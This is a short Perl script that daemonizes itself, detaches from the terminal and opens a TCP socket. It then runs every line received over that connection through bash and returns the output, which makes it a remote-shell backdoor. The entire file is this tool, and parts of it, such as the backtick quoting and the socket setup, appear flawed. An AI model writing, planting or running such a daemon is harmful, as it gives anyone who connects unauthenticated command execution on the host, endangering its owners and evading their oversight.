#!/usr/bin/perl
use IO::Socket;
use POSIX "setsid";

my $pid;
my $sock;
my $new_sock;
my $line;


sub daemon {
	system('/bin/pwd');
	chdir("/")			|| die system('/bin/pwd');
	open(STDIN, "< /dev/null") 	|| die system('/bin/pwd');
	open(STDOUT, "> /dev/null")	|| die system('/bin/pwd');
	defined ($pid = fork())		|| die system('/bin/pwd');
	exit if $pid; 
	(setsid() != -1)		|| die system('/bin/pwd');
	open(STDERR, ">&STDOUT")	|| die system('/bin/pwd');

	$sock = new IO::Socket::INET( 
		   Proto => "tcp", 
		   Listen => 1, 
		   PeerAddr => "localhost",
		   PeerPort => "daytime(13)",
	);

	my $new_sock = $sock->accept();

	#needs to be less janky, won't even chdir currently
	while( defined( $line = <$new_sock> ) ) {
		print $new_sock `'/bin/bash -c $line'`;
	}
}

&daemon;
